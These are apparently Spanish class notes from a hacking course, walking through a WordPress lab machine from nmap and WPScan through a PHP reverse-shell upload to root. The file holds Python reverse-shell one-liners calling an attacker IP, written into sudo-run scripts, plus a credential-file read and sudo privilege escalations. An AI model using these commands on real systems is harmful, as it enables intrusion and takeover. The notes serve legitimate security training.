> [!info] Ficha tÃ©cnica
> **Instructor:** Carlos GÃ³mez Pintado (el coletas) Â· **Fecha:** 01/07/2026
> **MÃ³dulo:** AuditorÃ­a web Â· WordPress Â· WPScan Â· File Upload Â· Reverse Shell Â· Escalada de privilegios
> **Entorno:** Kali Linux Â· MÃ¡quina Academy de HackerLab
> **Participantes destacados:** Chema (resolviÃ³ la mÃ¡quina), Chema (asistente de Carlos), Pablo, Charchas, Manu, Mariana, Oscar, Juan Carlos

> [!tip] CÃ³mo leer estos apuntes
> Esta sesiÃ³n es la primera clase enteramente prÃ¡ctica del mÃ³dulo de hacking web, usando una mÃ¡quina de HackerLab con WordPress. La particularidad es que **Chema, un alumno, lleva el peso de la explotaciÃ³n guiado por Carlos**, lo que convierte la clase en un ejercicio de metodologÃ­a razonada en voz alta. Se consolidan conceptos clave: la diferencia entre webs nativas y CMS, la cadena de dependencias de plugins, el uso de WPScan con y sin API, la lÃ³gica del file upload como vector de ataque, y la diferencia operativa entre bind shell y reverse shell.

---

## â‘  Webs nativas vs CMS y la cadena de dependencias

### La distinciÃ³n fundamental

Antes de tocar herramientas, Carlos establece una distinciÃ³n que cambia cÃ³mo se audita una web:

| Tipo | Ejemplos | CÃ³mo se audita |
|------|----------|----------------|
| **Web nativa** | PHP, .NET, Java, Go | Directamente sobre su cÃ³digo y configuraciÃ³n |
| **CMS** | WordPress, Drupal, Joomla, Shopify | Motor + Tema + Plugins |

### WordPress como motor de tres capas

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. WORDPRESS (motor) â€” NÃºcleo que hace funcionar todo â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 2. TEMA / PLANTILLA (carcasa) â€” Lo visual â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 3. PLUGINS (accesorios) â€” Funcionalidades â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

> [!important] DistribuciÃ³n asimÃ©trica del riesgo
> - **NÃºcleo de WordPress**: rara vez tiene vulnerabilidades explotables sin autenticaciÃ³n previa
> - **Tema**: puede tener vulnerabilidades, pero es cÃ³digo visual
> - **Plugins**: desarrollados mayoritariamente por comunidades **sin revisiÃ³n de seguridad formal**, concentran la inmensa mayorÃ­a de vectores de ataque

### La cadena va mÃ¡s lejos: dependencias en cascada

```
Plugin â†’ LibrerÃ­as â†’ Dependencias de 2Âº nivel â†’ Componentes de 3er nivel
```

Cualquier eslabÃ³n de esa cadena puede ser vulnerable. Esto conecta directamente con la categorÃ­a de **fallos en la cadena de suministro** del OWASP Top 10, que ahora cobra sentido prÃ¡ctico concreto.

> [!note] La metÃ¡fora del coche de Carlos
> "WordPress es el motor (Lamborghini). El tema es la carcasa (Urus o Audi RQ8 â€” mismo motor, carcasa distinta). Los plugins son los accesorios: alerÃ³n, asientos de cuero, volante de fibra. Â¿En cuÃ¡les puedo tener vulnerabilidades? **En los plugins**. Y el alerÃ³n puede ser de carbono o de Aliexpress. Esas son las librerÃ­as que componen el plugin. Â¿Puede tener vulnerabilidades una librerÃ­a que compone una librerÃ­a que compone un plugin? SÃ­. Pegasus era una librerÃ­a Tier 3 de las llamadas de WhatsApp."

---

## â‘¡ Reconocimiento y enumeraciÃ³n â€” MÃ¡quina Academy

### Ficha tÃ©cnica de la mÃ¡quina

| Dato | Valor |
|------|-------|
| **MÃ¡quina** | Academy (HackerLab) |
| **Puertos** | 22 (SSH), 80 (HTTP Apache 2.4.59) |
| **TecnologÃ­a** | WordPress en `/wordpress` |
| **Vector inicial** | File Upload en panel de administraciÃ³n â†’ RCE |
| **Escalada** | Cron job / Script hijacking (se ve en siguiente clase) |

### Paso 1: Netdiscover + Nmap

```bash
# Descubrir IP en el rango
sudo netdiscover -r 10.0.2.0/24

# Escaneo de puertos y servicios
nmap -sC -sV -p- 10.0.2.8 --min-rate 1500
```

**Resultado:**
- Puerto 22: SSH (necesita credenciales â€” no brute force todavÃ­a)
- Puerto 80: HTTP Apache 2.4.59

> [!note] Â¿Por quÃ© no vamos directo al 22?
> "Porque SSH necesitarÃ­amos tener credenciales. Como no nos metamos ahora mismo directamente a pegarnos cabezazos contra una fuerza bruta, no podemos hacer nada."

### Paso 2: AnÃ¡lisis de la web â€” DetecciÃ³n de WordPress

```bash
# Ver tecnologÃ­as con Wappalyzer (extensiÃ³n navegador)
# O desde terminal:
nikto -h 10.0.2.8
```

**Hallazgo crÃ­tico:** La web principal **no es WordPress**. WordPress estÃ¡ en el directorio `/wordpress`.

> [!warning] Error clÃ¡sico de OSCP
> "Si tienes una pÃ¡gina web que tiene WordPress **no significa** que toda la pÃ¡gina web sea WordPress. Yo puedo tener una web nativa en `/`, y en `/wordpress` un blog, en `/drupal` un Drupal, etc. Si lanzas WPScan contra la raÃ­z, te dice 'aquÃ­ no hay WordPress'. **Siempre lanza la herramienta contra el directorio que contiene la tecnologÃ­a vulnerable**."

### Paso 3: WPScan â€” La navaja suiza de WordPress

```bash
# Instalar/actualizar WPScan
gem install wpscan

# Uso bÃ¡sico SIN API (limitado)
wpscan --url http://10.0.2.8/wordpress

# Con API key (gratuita en wpscan.com)
wpscan --url http://10.0.2.8/wordpress --api-token TU_TOKEN
```

| Sin API | Con API |
|---------|---------|
| Lista plugins instalados | **Detecta vulnerabilidades** de cada plugin |
| VersiÃ³n de WordPress | VersiÃ³n + CVEs asociados |
| Tema activo | Vulnerabilidades del tema |
| Usuarios enumerados | EnumeraciÃ³n completa |

> [!important] La diferencia es brutal
> "FÃ­jate ahora cÃ³mo han contado vulnerabilidades de la versiÃ³n de WordPress que antes no nos habÃ­a encontrado. Antes nos ponÃ­a 'WordPress 6.5.3' y nada mÃ¡s. Ahora que le hemos puesto la API que se conecta a su base de datos de vulnerabilidades, ahora sÃ­ que nos estÃ¡ diciendo quÃ© CVEs afectan."

### Paso 4: EnumeraciÃ³n de usuarios

```bash
# Enumerar usuarios (requiere API para lista completa)
wpscan --url http://10.0.2.8/wordpress -e u
# -e u = enumerate users
```

**Usuarios encontrados:** `dylan` (contraseÃ±a: `1` â€” increÃ­blemente dÃ©bil)

---

## â‘¢ ExplotaciÃ³n â€” File Upload en panel de administraciÃ³n

### Acceso al panel

```
URL: http://10.0.2.8/wordpress/wp-login.php
User: dylan
Pass: 1
```

### Vector: Bit File Manager

En el panel de administraciÃ³n, Chema identifica un plugin interesante: **Bit File Manager** en `wp-content/uploads`.

> [!note] El binomio mÃ¡gico
> "Si encontramos un **uploader** y un **uploads** donde se almacenan las cosas y las podemos ejecutar, tenemos RCE. Son las dos componentes de la masilla dos en uno."

### Subida de reverse shell PHP

1. Navegar a Bit File Manager â†’ `wp-content` â†’ `uploads`
2. Subir `php-reverse-shell.php` (de `/usr/share/webshells/php/`)
3. Editar la shell: cambiar IP y puerto
4. Poner Netcat a la escucha: `nc -lvnp 1234`
5. Ejecutar la shell accediendo a `http://10.0.2.8/wordpress/wp-content/uploads/php-reverse-shell.php`

```bash
# En atacante
nc -lvnp 1234

# En la shell obtenida
whoami
# www-data
```

> [!important] Webshell vs Reverse Shell
> - **Webshell**: tÃº te conectas a la mÃ¡quina (necesitas que el firewall te deje entrar)
> - **Reverse shell**: la mÃ¡quina se conecta a ti (el firewall suele permitir salidas)
> - **Por lo general, siempre reverse shell**. Si el firewall bloquea conexiones entrantes pero no salientes, la reverse es la Ãºnica opciÃ³n.

### EstabilizaciÃ³n de la shell

```bash
# En la reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## â‘£ Movimiento lateral y escalada â€” Chema resuelve la mÃ¡quina

### Usuario www-data â†’ Mike

```bash
# En /etc/passwd se ve usuario mike con /bin/bash
# En wp-config.php (leÃ­do via LFI o explorando) hay credenciales de BD
# ReutilizaciÃ³n de credenciales: mismo user/pass para SSH

ssh mike@10.0.2.8
# Password: [la del config.php]
```

### Mike â†’ N (via sudo -l + GTFOBins)

```bash
$ sudo -l
User mike may run the following commands:
 (n) NOPASSWD: /usr/bin/java
```

**GTFOBins â†’ Java â†’ Sudo**

```bash
# Crear exploit Java
cat > shell.java << 'EOF'
public class shell {
 public static void main(String[] args) throws Exception {
 ProcessBuilder pb = new ProcessBuilder("/bin/bash");
 pb.inheritIO().start().waitFor();
 }
}
EOF

# Compilar y ejecutar
javac shell.java
sudo -u n /usr/bin/java shell
# Â¡Somos usuario n!
```

### N â†’ Pilon (via sudo -l + Python)

```bash
$ sudo -l
User n may run the following commands:
 (pilon) NOPASSWD: /usr/bin/python3 /opt/suma.py
```

> [!warning] RestricciÃ³n importante
> "Ahora cambia la pelÃ­cula. No puedo crear cualquier archivo de Python y ejecutarlo. **Solo puedo ejecutar ese archivo exacto**: `python3 /opt/suma.py`. Tengo que **modificar ese archivo**."

```bash
# Ver contenido actual
cat /opt/suma.py
# import os; print("suma")

# Sobrescribir con reverse shell
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.195",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' > /opt/suma.py

# Ejecutar como pilon
sudo -u pilon /usr/bin/python3 /opt/suma.py
# Â¡Somos pilon!
```

### Pilon â†’ Root (Cron job / Script hijacking)

```bash
$ sudo -l
User pilon may run the following commands:
 (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
```

```bash
# Ver backup.py
cat /opt/backup.py
# Hace un backup, se ejecuta periÃ³dicamente como root (cron)

# Modificar para reverse shell
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.195",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' > /opt/backup.py

# Esperar cron (o ejecutar si se puede)
sudo -u root /usr/bin/python3 /opt/backup.py
# Â¡ROOT!
```

---

## â‘¤ Conceptos clave consolidados

| Concepto | ExplicaciÃ³n |
|----------|-------------|
| **Web nativa vs CMS** | AuditorÃ­a diferente: cÃ³digo propio vs motor+tema+plugins |
| **Cadena de dependencias** | Plugin â†’ librerÃ­a â†’ dependencia â†’ componente; cualquier eslabÃ³n vulnerable |
| **WPScan con API** | Gratis, ilimitada para uso personal, **imprescindible** para ver CVEs |
| **Directorio correcto** | Lanza herramientas contra el path que contiene la tecnologÃ­a vulnerable |
| **File Upload = RCE** | Necesitas: 1) Uploader funcional, 2) Directorio uploads accesible y ejecutable |
| **Reverse vs Bind** | Reverse: vÃ­ctima â†’ atacante (atravesan firewalls). Bind: atacante â†’ vÃ­ctima |
| **sudo -l + GTFOBins** | Procedimiento estÃ¡ndar post-explotaciÃ³n |
| **Movimiento lateral** | ReutilizaciÃ³n de credenciales, sudo -u, explotaciÃ³n de binarios con SUID |
| **Script hijacking** | Modificar un script que root ejecuta periÃ³dicamente (cron) |

---

## â‘¥ Comandos de la sesiÃ³n

```bash
# === DESCUBRIMIENTO ===
sudo netdiscover -r 10.0.2.0/24
nmap -sC -sV -p- 10.0.2.8 --min-rate 1500

# === ENUMERACIÃ“N WORDPRESS ===
wpscan --url http://10.0.2.8/wordpress --api-token TU_TOKEN
wpscan --url http://10.0.2.8/wordpress -e u # usuarios

# === ACCESO PANEL ===
# http://10.0.2.8/wordpress/wp-login.php
# dylan / 1

# === FILE UPLOAD (Bit File Manager) ===
# wp-content/uploads/ â†’ subir php-reverse-shell.php
# Editar IP/puerto en la shell
nc -lvnp 1234
# Ejecutar: curl http://10.0.2.8/wordpress/wp-content/uploads/php-reverse-shell.php

# === ESTABILIZACIÃ“N ===
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z â†’ stty raw -echo; fg â†’ export TERM=xterm

# === MOVIMIENTO LATERAL ===
# Leer wp-config.php para credenciales BD
cat /var/www/html/wordpress/wp-config.php
# Reutilizar en SSH
ssh mike@10.0.2.8

# === ESCALADA MIKE â†’ N (JAVA) ===
sudo -l
# (n) NOPASSWD: /usr/bin/java
# GTFOBins â†’ Java â†’ Sudo
javac shell.java
sudo -u n /usr/bin/java shell

# === ESCALADA N â†’ PILON (PYTHON) ===
sudo -l
# (pilon) NOPASSWD: /usr/bin/python3 /opt/suma.py
# Modificar /opt/suma.py con reverse shell
sudo -u pilon /usr/bin/python3 /opt/suma.py

# === ESCALADA PILON â†’ ROOT (CRON) ===
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
# Modificar /opt/backup.py â†’ reverse shell
sudo -u root /usr/bin/python3 /opt/backup.py
```

---

## â‘¦ Notas de clase

- **Chema** resolviÃ³ la mÃ¡quina completa guiado por Carlos â€” ejercicio de metodologÃ­a en voz alta
- **Carlos** explicÃ³ la diferencia web nativa vs CMS, cadena de dependencias, WPScan con/sin API
- **Pablo** preguntÃ³ por la diferencia entre bind/reverse shell â€” explicaciÃ³n clave de firewall
- **Mariana, Charchas, Oscar, Juan Carlos** participaron en la discusiÃ³n
- Se mencionÃ³ que **el viernes viene Dani** para repaso
- **La semana siguiente viene Castillo** para phishing con GoPhish y calentamiento de dominios
- Herramienta OSINT de **Chris** estÃ¡ en su GitHub
- Se creÃ³ un **QR de prueba** para "El Goico" como ejercicio de QRishing
- El **fuzzer en Python fue creado por Asier** durante la clase y funcionÃ³ correctamente
- Se mencionÃ³ a **Nacho** como experto en anonimato (Trocador, Mulvad, Njala)
- La mÃ¡quina **Academy** es de HackerLab y simula un WordPress con Bit File Manager
- **ProfPoint** se mencionÃ³ para campaÃ±as de phishing (pero es "un coÃ±azo")
- **Vinted** se mencionÃ³ como ejemplo de scams: "vendÃ­an un peluche de 1.30m y 60 kilos por 30.000â‚¬"

---

## â‘§ ConexiÃ³n con otras sesiones

> [!note] Sesiones relacionadas
> - **SesiÃ³n anterior** (30/06): Primeras mÃ¡quinas y fundamentos de pentesting
> - **SesiÃ³n siguiente** (02/07): Fuzzing, Directory Listing y Escalada por Script Hijacking
> - **MÃ¡quina Rockstar** (apunte anterior): Path Traversal â†’ LFI â†’ /etc/passwd
> - **PrÃ³xima semana**: ByCode y DevOps (IA, arquitecturas, servidores)

---

> [!tip] La lecciÃ³n mÃ¡s importante de esta sesiÃ³n
> "Siempre hay que hacer una enumeraciÃ³n mÃ­nima antes de explotar. Si no lo haces, te vas a hacer esperar tÃº antes que la pÃ¡gina caiga. Primero conocemos, despuÃ©s conectamos, y ya despuÃ©s explotamos."
> â€” Carlos GÃ³mez Pintado

â†’

â†’

â†’

â†’
â†’
